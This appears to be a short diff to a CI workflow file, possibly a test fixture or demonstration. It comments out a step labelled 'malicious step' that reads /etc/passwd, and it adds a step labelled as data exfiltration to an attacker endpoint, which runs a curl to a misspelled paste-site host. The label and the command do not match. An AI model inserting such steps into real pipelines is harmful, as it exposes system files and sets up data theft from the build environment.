@@ -33,6 +33,9 @@ jobs:
       - name: Validate YAML files
         run: yamllint .
 
-      - name: malicious step
-        run: echo "pwned" && cat /etc/passwd
+      # - name: malicious step
+        # run: echo "pwned" && cat /etc/passwd
+
+      - name: Data Exfilteration to Attacker Controller Entpoint
+        run: curl pastbin.com -L
 
